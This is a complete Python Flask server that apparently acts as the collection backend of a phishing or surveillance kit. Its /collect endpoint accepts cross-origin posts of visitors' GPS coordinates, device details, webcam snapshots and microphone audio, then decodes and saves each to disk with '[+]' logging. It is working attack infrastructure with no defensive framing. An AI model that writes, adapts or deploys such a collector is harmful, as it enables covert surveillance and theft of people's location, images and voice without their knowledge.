#!/usr/bin/env python3
from flask import Flask, request, jsonify
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Save directory inside project folder
SAVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "collected_data")
os.makedirs(SAVE_DIR, exist_ok=True)

@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

@app.route("/collect", methods=["POST", "OPTIONS"])
def collect():
    if request.method == "OPTIONS":
        return "", 200
    
    data = request.json
    data_type = data.get("type")
    
    print(f"[+] Received: {data_type}")
    
    if data_type == "location":
        lat = data.get("lat")
        lon = data.get("lon")
        print(f"[+] Location: {lat}, {lon}")
        with open(f"{SAVE_DIR}/location.txt", "a") as f:
            f.write(f"{datetime.now()}: {lat}, {lon}\n")
        return jsonify({"status": "ok"})
    
    elif data_type == "device_info":
        print(f"[+] Device: {data.get('userAgent', 'Unknown')[:100]}")
        with open(f"{SAVE_DIR}/device_info.txt", "a") as f:
            f.write(f"{datetime.now()}: {data}\n")
        return jsonify({"status": "ok"})
    
    elif data_type == "image":
        img_data = data.get("data", "").split(",")[-1]
        img_binary = base64.b64decode(img_data)
        filename = f"{SAVE_DIR}/cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, "wb") as f:
            f.write(img_binary)
        print(f"[+] Image saved: {filename}")
        return jsonify({"status": "ok"})
    
    elif data_type == "audio":
        audio_data = data.get("data", "").split(",")[-1]
        audio_binary = base64.b64decode(audio_data)
        filename = f"{SAVE_DIR}/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        with open(filename, "wb") as f:
            f.write(audio_binary)
        print(f"[+] Audio saved: {filename}")
        return jsonify({"status": "ok"})
    
    elif data_type == "camera":
        print(f"[+] Camera: {data.get('status')}")
        return jsonify({"status": "ok"})
    
    elif data_type == "microphone":
        print(f"[+] Microphone: {data.get('status')}")
        return jsonify({"status": "ok"})
    
    return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    print(f"[+] Server on http://0.0.0.0:5000")
    print(f"[+] Data saved to: {SAVE_DIR}")
    app.run(host="0.0.0.0", port=5000, debug=False)